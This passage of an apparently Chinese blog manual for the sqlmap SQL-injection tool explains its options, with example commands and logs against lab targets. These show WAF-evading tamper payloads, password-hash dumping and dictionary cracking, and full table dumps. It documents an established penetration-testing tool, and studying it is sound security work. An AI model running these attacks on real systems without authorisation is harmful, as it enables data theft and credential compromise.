<p><code>key_file</code>是格式为PEM文件，包含着你的私钥，<code>cert_file</code>是格式为<code>PEM</code>的连接文件。</p>
<p>###HTTP(S)代理</p>
<p>参数：<code>--proxy,--proxy-cred</code>和<code>--ignore-proxy</code></p>
<p>使用<code>--proxy</code>代理是格式为：<code>http://url:port。</code></p>
<p>当<code>HTTP(S)</code>代理需要认证是可以使用<code>–proxy-cred</code>参数：<code>username:password</code>。</p>
<p><code>--ignore-proxy</code>拒绝使用本地局域网的<code>HTTP(S)</code>代理。</p>
<p>###HTTP请求延迟</p>
<p>参数：<code>–delay</code></p>
<p>可以设定两个<code>HTTP(S)</code>请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
<p>###设定超时时间</p>
<p>参数：<code>–timeout</code></p>
<p>可以设定一个<code>HTTP(S)</code>请求超过多久判定为超时，<code>10.5</code>表示<code>10.5</code>秒，默认是<code>30</code>秒。</p>
<p>###设定重试超时</p>
<p>参数：<code>–retries</code></p>
<p>当<code>HTTP(S)</code>超时时，可以设定重新尝试连接次数，默认是3次。</p>
<p>###设定随机改变的参数值</p>
<p>参数：<code>--randomize</code></p>
<p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p>
<p>利用正则过滤目标网址</p>
<p>参数：<code>--scope</code></p>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l burp.log --scope="(www)?\.target\.(com\|net\|org)"</span><br></pre></td></tr></table></figure>

<p>###避免过多的错误请求被屏蔽</p>
<p>参数：<code>--safe-url,--safe-freq</code></p>
<p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>
<p>###绕过这个策略有两种方式：</p>
<ul>
<li><code>--safe-url</code>：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li>
<li><code>--safe-freq</code>：提供一个安全不错误的连接，一段频率后会访问一次。</li>
</ul>
<p>###关掉URL参数值编码</p>
<p>参数：<code>--skip-urlencode</code></p>
<p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过<code>URL</code>编码的值，这时候就需要用<code>–skip-urlencode</code>参数。</p>
<p>###每次请求时候执行自定义的python代码</p>
<p>参数：<code>--eval</code></p>
<p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p>
<p>例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u</span><br><span class="line">"http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b"</span><br><span class="line">--eval="import hashlib;hash=hashlib.md5(id).hexdigest()"</span><br></pre></td></tr></table></figure>

<p>上面的请求就是每次请求时根据id参数值，做一次<code>md5</code>后作为<code>hash</code>参数的值。</p>
<p>##注入</p>
<p>###测试参数</p>
<p>参数：<code>-p</code></p>
<p>如： <code>-p “id,user-anget”</code></p>
<p>###指定要跳过测试的参数</p>
<p>参数：<code>--skip</code></p>
<p>如：<code>--skip=”user-angent,referer</code></p>
<p>对于伪静态链接，可以在想测试的参数后面加*，它会测试那个指定的参数</p>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"</span><br></pre></td></tr></table></figure>

<p>###指定数据库</p>
<p>参数：<code>--dbms</code></p>
<p>不指定会自动探测，如果知道最好指定</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft</span><br><span class="line">Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2</span><br></pre></td></tr></table></figure>

<p>###指定服务器系统</p>
<p>参数：<code>--os</code></p>
<p>不指定会自动探测，支持的有：<code>Linux、Windows</code>。</p>
<p>###指定无效的大数字</p>
<p>参数：<code>--invalid-bignum</code></p>
<p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系<code>id=13，sqlmap</code>会变成<code>id=-13</code>来报错，你可以指定比如<code>id=9999999</code>来报错。</p>
<p>###指定无效的逻辑</p>
<p>参数：<code>--invalid-logical</code></p>
<p>原因同上，可以指定<code>id=13</code>把原来的<code>id=-13</code>的报错改成<code>id=13 AND 18=19</code>。</p>
<p>###注入payload</p>
<p>参数：<code>--prefix,--suffix</code></p>
<p>在有些环境中，需要在注入的<code>payload</code>的前面或者后面加一些字符，来保证<code>payload</code>的正常执行。</p>
<p>例如，代码中是这样调用数据库的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">query = <span class="string">"SELECT * FROM users WHERE id=(’"</span> . <span class="variable">$_GET</span>[’id’] . <span class="string">"’) LIMIT 0, 1"</span>;</span></span><br></pre></td></tr></table></figure>

<p>这时你就需要<code>--prefix</code>和<code>--suffix</code>参数了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix</span><br><span class="line">"’)" --suffix "AND (’abc’=’abc"</span><br></pre></td></tr></table></figure>

<p>这样执行的SQL语句变成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">query = <span class="string">"SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’)</span></span></span><br><span class="line">LIMIT 0, 1";</span><br></pre></td></tr></table></figure>

<p>###修改注入的数据</p>
<p>参数：<code>--tamper</code></p>
<p><code>sqlmap</code>除了使用<code>CHAR（）</code>函数来防止出现单引号之外没有对注入的数据修改，你可以使用<code>--tamper</code>参数对数据做修改来绕过WAF等设备。<br>下面是一个<code>tamper</code>脚本的格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Needed imports</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="comment"># Define which is the order of application of tamper scripts against</span></span><br><span class="line"><span class="comment"># the payload</span></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload)</span>:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Description of your tamper script</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">retVal = payload</span><br><span class="line"><span class="comment"># your code to tamper the original payload</span></span><br><span class="line"><span class="comment"># return the tampered payload</span></span><br><span class="line"><span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<p>可以查看 <code>tamper/</code> 目录下的有哪些可用的脚本</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1"</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v <span class="number">3</span></span><br><span class="line"></span><br><span class="line">[hh:mm:<span class="number">03</span>] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[hh:mm:<span class="number">03</span>] [INFO] loading tamper script <span class="string">'between'</span></span><br><span class="line">[hh:mm:<span class="number">03</span>] [INFO] loading tamper script <span class="string">'randomcase'</span></span><br><span class="line">[hh:mm:<span class="number">03</span>] [INFO] loading tamper script <span class="string">'space2comment'</span></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:<span class="number">04</span>] [INFO] testing <span class="string">'AND boolean-based blind - WHERE or HAVING clause'</span></span><br><span class="line">[hh:mm:<span class="number">04</span>] [PAYLOAD] <span class="number">1</span>)/**/And/**/<span class="number">1369</span>=<span class="number">7706</span>/**/And/**/(<span class="number">4092</span>=<span class="number">4092</span></span><br><span class="line">[hh:mm:<span class="number">04</span>] [PAYLOAD] <span class="number">1</span>)/**/AND/**/<span class="number">9267</span>=<span class="number">9267</span>/**/AND/**/(<span class="number">4057</span>=<span class="number">4057</span></span><br><span class="line">[hh:mm:<span class="number">04</span>] [PAYLOAD] <span class="number">1</span>/**/AnD/**/<span class="number">950</span>=<span class="number">7041</span></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:<span class="number">04</span>] [INFO] testing <span class="string">'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'</span></span><br><span class="line">[hh:mm:<span class="number">04</span>] [PAYLOAD] <span class="number">1</span>/**/anD/**/(SELeCt/**/<span class="number">9921</span>/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(</span><br><span class="line"><span class="number">58</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">107</span>,<span class="number">58</span>),(SELeCt/**/(case/**/whEN/**/(<span class="number">9921</span>=<span class="number">9921</span>)/**/THeN/**/<span class="number">1</span>/**/elsE/**/<span class="number">0</span>/**/</span><br><span class="line">ENd)),cHar(<span class="number">58</span>,<span class="number">106</span>,<span class="number">104</span>,<span class="number">104</span>,<span class="number">58</span>),FLOOR(RanD(<span class="number">0</span>)*<span class="number">2</span>))x/**/fROm/**/information_schema.tables/**/</span><br><span class="line">group/**/bY/**/x)a)</span><br><span class="line">[hh:mm:<span class="number">04</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING</span></span><br><span class="line"><span class="string">clause'</span> injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><h3 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h3><p>参数：<code>--level</code></p>
<p>共有五个等级，默认为<code>1，sqlmap</code>使用的<code>payload</code>可以在<code>xml/payloads.xml</code>中看到，你也可以根据相应的格式添加自己的<code>payload</code>。</p>
<p>这个参数不仅影响使用哪些<code>payload</code>同时也会影响测试的注入点，<code>GET</code>和<code>POST</code>的数据都会测试，<code>HTTP Cookie</code>在<code>level</code>为2的时候</p>
<p>就会测试，<code>HTTP User-Agent/Referer</code>头在<code>level</code>为3的时候就会测试。</p>
<p>总之在你不确定哪个<code>payload</code>或者参数为注入点的时候，为了保证全面性，建议使用高的<code>level</code>值。</p>
<h3 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h3><p>参数：<code>--risk</code></p>
<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
<p>测试的语句同样可以在<code>xml/payloads.xml</code>中找到，你也可以自行添加<code>payload</code>。</p>
<h3 id="页面比较"><a href="#页面比较" class="headerlink" title="页面比较"></a>页面比较</h3><p>参数：<code>--string,--not-string,--regexp,--code</code></p>
<p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。</p>
<p>参数：<code>--text-only,--titles</code></p>
<p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p>
<h2 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h2><h3 id="测试是否注入"><a href="#测试是否注入" class="headerlink" title="测试是否注入"></a>测试是否注入</h3><p>参数：<code>--technique</code></p>
<p>这个参数可以指定<code>sqlmap</code>使用的探测技术，默认情况下会测试所有的方式。</p>
<p>支持的探测方式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>

<h3 id="设定延时注入时间"><a href="#设定延时注入时间" class="headerlink" title="设定延时注入时间"></a>设定延时注入时间</h3><p>参数：<code>--time-sec</code></p>
<p>当使用继续时间的盲注时，时刻使用<code>–time-sec</code>参数设定延时时间，默认是5秒。</p>
<h3 id="设定UNION查询字段数"><a href="#设定UNION查询字段数" class="headerlink" title="设定UNION查询字段数"></a>设定UNION查询字段数</h3><p>参数：<code>--union-cols</code></p>
<p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。</p>
<p>设定<code>--union-cols</code>的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
<h3 id="设定UNION查询使用的字符"><a href="#设定UNION查询使用的字符" class="headerlink" title="设定UNION查询使用的字符"></a>设定UNION查询使用的字符</h3><p>参数：<code>--union-char</code></p>
<p>默认情况下<code>sqlmap</code>针对<code>UNION</code>查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，</p>
<p>这是你可以用<code>–-union-char</code>只定UNION查询的字符。</p>
<h3 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h3><p>参数：<code>--second-order</code></p>
<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。</p>
<p><code>--second-order</code>后面跟一个判断页面的URL地址。</p>
<h3 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h3><p>参数：<code>-b,--banner</code></p>
<p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p>
<h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>参数：<code>--current-user</code></p>
<p>在大多数据库中可以获取到管理数据的用户。</p>
<h3 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h3><p>参数：<code>--current-db</code></p>
<p>返还当前连接的数据库。</p>
<h3 id="当前用户是否为管理员"><a href="#当前用户是否为管理员" class="headerlink" title="当前用户是否为管理员"></a>当前用户是否为管理员</h3><p>参数：<code>--is-dba</code></p>
<p>判断当前的用户是否为管理，是的话会返回True。</p>
<h3 id="列数据库管理用户"><a href="#列数据库管理用户" class="headerlink" title="列数据库管理用户"></a>列数据库管理用户</h3><p>参数：<code>--users</code></p>
<p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>
<h3 id="列出并破解数据库用户的hash"><a href="#列出并破解数据库用户的hash" class="headerlink" title="列出并破解数据库用户的hash"></a>列出并破解数据库用户的hash</h3><p>参数：<code>--passwords</code></p>
<p>当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://********/sqlmap/pgsql/get_int.php?id=1"</span> --passwords -v <span class="number">1</span></span><br><span class="line">[...]</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:<span class="number">38</span>] [INFO] fetching database users password hashes</span><br><span class="line">do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y</span><br><span class="line">[hh:mm:<span class="number">42</span>] [INFO] using hash method: <span class="string">'postgres_passwd'</span></span><br><span class="line">what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt]</span><br><span class="line">[hh:mm:<span class="number">46</span>] [INFO] loading dictionary <span class="keyword">from</span>: <span class="string">'/software/sqlmap/txt/wordlist.txt'</span></span><br><span class="line">do you want to use common password suffixes? (slow!) [y/N] n</span><br><span class="line">[hh:mm:<span class="number">48</span>] [INFO] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:<span class="number">49</span>] [INFO] found: <span class="string">'testpass'</span> <span class="keyword">for</span> user: <span class="string">'testuser'</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] found: <span class="string">'testpass'</span> <span class="keyword">for</span> user: <span class="string">'postgres'</span></span><br><span class="line">database management system users password hashes:</span><br><span class="line">[*] postgres [<span class="number">1</span>]:</span><br><span class="line">password hash: md5d7d880f96044b72d0bba108ace96d1e4</span><br><span class="line">clear-text password: testpass</span><br><span class="line">[*] testuser [<span class="number">1</span>]:</span><br><span class="line">password hash: md599e5ea7a6f7c3269995cba3927fd0093</span><br><span class="line">clear-text password: testpass</span><br></pre></td></tr></table></figure>

<p>可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持<code>Oracle</code>和<code>Microsoft SQL Server</code>。也可以提供-U参数来指定爆破哪个用户的<code>hash</code>。</p>
<h3 id="列出数据库管理员权限"><a href="#列出数据库管理员权限" class="headerlink" title="列出数据库管理员权限"></a>列出数据库管理员权限</h3><p>参数：<code>--privileges</code></p>
<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p>
<h3 id="列出数据库管理员角色"><a href="#列出数据库管理员角色" class="headerlink" title="列出数据库管理员角色"></a>列出数据库管理员角色</h3><p>参数：<code>--roles</code></p>
<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</p>
<p>仅适用于当前数据库是<code>Oracle</code>的时候。</p>
<h3 id="列出数据库系统的数据库"><a href="#列出数据库系统的数据库" class="headerlink" title="列出数据库系统的数据库"></a>列出数据库系统的数据库</h3><p>参数：<code>--dbs</code></p>
<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
<h3 id="列出数据库表"><a href="#列出数据库表" class="headerlink" title="列出数据库表"></a>列出数据库表</h3><p>参数：<code>--tables,--exclude-sysdbs,-D</code></p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "http://192.168.163.138/mutillidae/index.php?page=user-info.php&amp;username=111&amp;password=12123&amp;user-info-php-submit-button=View+Account+Details"</span><br><span class="line">--tables -D dvwa</span><br></pre></td></tr></table></figure>

<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。–exclude-sysdbs参数是指包含了所有的系统数据库。需要注意的是在Oracle中你需要提供的TABLESPACE_NAME而不是数据库名称。</p>
<h3 id="列举数据库表中的字段"><a href="#列举数据库表中的字段" class="headerlink" title="列举数据库表中的字段"></a>列举数据库表中的字段</h3><p>参数：<code>--columns,-C,-T,-D</code></p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://*******/sqlmap/sqlite/get_int.php?id=1"</span> --columns -D testdb -T users -C name</span></span><br><span class="line">[...]</span><br><span class="line">Database: SQLite_masterdb</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+---------+---------+</span><br><span class="line">| Column  | Type|</span><br><span class="line">+---------+---------+</span><br><span class="line">| id  | INTEGER |</span><br><span class="line">| name| TEXT|</span><br><span class="line">| surname | TEXT|</span><br><span class="line">+---------+---------+</span><br></pre></td></tr></table></figure>

<h3 id="列举数据库系统的架构"><a href="#列举数据库系统的架构" class="headerlink" title="列举数据库系统的架构"></a>列举数据库系统的架构</h3><p>参数：<code>--schema,--exclude-sysdbs</code></p>
<p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。加上<code>--exclude-sysdbs</code>参数，将不会获取数据库自带的系统库内容。</p>
<p>MySQL例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://*******/sqlmap/mysql/get_int.php?id=1"</span> --schema --batch --exclude-sysdbs</span></span><br><span class="line">[...]</span><br><span class="line">Database: owasp10</span><br><span class="line">Table: accounts</span><br><span class="line">[4 columns]</span><br><span class="line">+-------------+---------+</span><br><span class="line">| Column  | Type|</span><br><span class="line">+-------------+---------+</span><br><span class="line">| cid | int(11) |</span><br><span class="line">| mysignature | text|</span><br><span class="line">| password| text|</span><br><span class="line">| username| text|</span><br><span class="line">+-------------+---------+</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: blogs_table</span><br><span class="line">[4 columns]</span><br><span class="line">+--------------+----------+</span><br><span class="line">| Column   | Type |</span><br><span class="line">+--------------+----------+</span><br><span class="line">| date | datetime |</span><br><span class="line">| blogger_name | text |</span><br><span class="line">| cid  | int(11)  |</span><br><span class="line">| comment  | text |</span><br><span class="line">+--------------+----------+</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: hitlog</span><br><span class="line">[6 columns]</span><br><span class="line">+----------+----------+</span><br><span class="line">| Column   | Type |</span><br><span class="line">+----------+----------+</span><br><span class="line">| date | datetime |</span><br><span class="line">| browser  | text |</span><br><span class="line">| cid  | int(11)  |</span><br><span class="line">| hostname | text |</span><br><span class="line">| ip   | text |</span><br><span class="line">| referer  | text |</span><br><span class="line">+----------+----------+</span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+---------+---------------+</span><br><span class="line">| Column  | Type  |</span><br><span class="line">+---------+---------------+</span><br><span class="line">| id  | int(11)   |</span><br><span class="line">| name| varchar(500)  |</span><br><span class="line">| surname | varchar(1000) |</span><br><span class="line">+---------+---------------+</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="获取表中数据个数"><a href="#获取表中数据个数" class="headerlink" title="获取表中数据个数"></a>获取表中数据个数</h3><p>参数：<code>--count</code></p>
<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
<p>列举一个<code>Microsoft SQL Server</code>例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"</span> --count -D testdb</span></span><br><span class="line">[...]</span><br><span class="line">Database: testdb</span><br><span class="line">+----------------+---------+</span><br><span class="line">| Table  | Entries |</span><br><span class="line">+----------------+---------+</span><br><span class="line">| dbo.users  | 4   |</span><br><span class="line">| dbo.users_blob | 2   |</span><br><span class="line">+----------------+---------+</span><br></pre></td></tr></table></figure>

<h3 id="获取整个表的数据"><a href="#获取整个表的数据" class="headerlink" title="获取整个表的数据"></a>获取整个表的数据</h3><p>参数：<code>--dump,-C,-T,-D,--start,--stop,--first,--last</code></p>
<p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</p>
<p>使用<code>-D,-T</code>参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。</p>
<p>列举一个<code>Firebird</code>的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.136.131/sqlmap/firebird/get_int.php?id=1"</span> --dump -T users</span></span><br><span class="line">[...]</span><br><span class="line">Database: Firebird_masterdb</span><br><span class="line">Table: USERS</span><br><span class="line">[4 entries]</span><br><span class="line">+----+--------+------------+</span><br><span class="line">| ID | NAME   | SURNAME|</span><br><span class="line">+----+--------+------------+</span><br><span class="line">| 1  | luther | blisset|</span><br><span class="line">| 2  | fluffy | bunny  |</span><br><span class="line">| 3  | wu | ming   |</span><br><span class="line">| 4  | NULL   | nameisnull |</span><br><span class="line">+----+--------+------------+</span><br></pre></td></tr></table></figure>

<p>可以获取指定库中的所有表的内容，只用<code>-dump</code>跟<code>-D</code>参数（不使用-T与-C参数）。</p>
<p>也可以用–dump跟-C获取指定的字段内容。sqlmap为每个表生成了一个CSV文件。如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop</p>
<ul>
<li><p>如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。也可以用<code>--first与--last</code>参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first3</p>
<p><img src="//choge.top/2019/11/26/Sqlmap之使用手册/sqlmap-3.png" alt="sqlmap-3"></p>
</li>
<li><p>–last只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p>
</li>
</ul>
<h3 id="获取所有数据库表的内容"><a href="#获取所有数据库表的内容" class="headerlink" title="获取所有数据库表的内容"></a>获取所有数据库表的内容</h3><p>参数：<code>--dump-all,--exclude-sysdbs</code></p>
<p>使用<code>--dump-all</code>参数获取所有数据库表的内容，可同时加上<code>–exclude-sysdbs</code>只获取用户数据库的表，需要注意在<code>Microsoft SQL Server</code>中<code>master</code>数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p>
<h3 id="搜索字段，表，数据库"><a href="#搜索字段，表，数据库" class="headerlink" title="搜索字段，表，数据库"></a>搜索字段，表，数据库</h3><p>参数：<code>--search,-C,-T,-D</code></p>
<p><code>--search</code>可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p>
<p>可以在一下三种情况下使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。</span><br><span class="line">-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名</span><br><span class="line">-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</span><br></pre></td></tr></table></figure>

<h3 id="运行自定义的SQL语句"><a href="#运行自定义的SQL语句" class="headerlink" title="运行自定义的SQL语句"></a>运行自定义的SQL语句</h3><p>参数：<code>--sql-query,--sql-shell</code></p>
<p><code>sqlmap</code>会自动检测确定使用哪种SQL注入技术，如何插入检索语句。如果是<code>SELECT</code>查询语句，<code>sqlmap</code>将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p>
<p>列举一个<code>Mircrosoft SQL Server 2000</code>的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://**********/sqlmap/mssql/get_int.php?id=1"</span></span></span><br><span class="line">--sql-query "SELECT 'foo'" -v 1</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''</span><br><span class="line">[hh:mm:14] [INFO] retrieved: foo</span><br><span class="line">SELECT 'foo': 'foo'</span><br><span class="line">\$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span><br><span class="line">--sql-query "SELECT 'foo', 'bar'" -v 2</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''</span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now</span><br><span class="line">unpack it into</span><br><span class="line">distinct queries to be able to retrieve the output even if we are going blind</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS</span><br><span class="line">VARCHAR(8000)),</span><br><span class="line">(CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: foo</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS</span><br><span class="line">VARCHAR(8000)),</span><br><span class="line">(CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: bar</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds</span><br><span class="line">SELECT 'foo', 'bar': 'foo, bar'</span><br></pre></td></tr></table></figure>

<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h3><p>参数：<code>--common-tables</code></p>
<p>当使用<code>--tables</code>无法获取到数据库的表时，可以使用此参数。</p>
<p>通常是如下情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. `MySQL`数据库版本小于5.0，没有`information_schema`表。</span><br><span class="line">2. 数据库是`Microssoft Access`，系统表`MSysObjects`是不可读的（默认）。</span><br><span class="line">3. 当前用户没有权限读取系统中保存数据结构的表的权限。</span><br></pre></td></tr></table></figure>

<p>暴力破解的表在<code>txt/common-tables.txt</code>文件中，你可以自己添加。</p>
<p>列举一个MySQL 4.1的例子：</p>
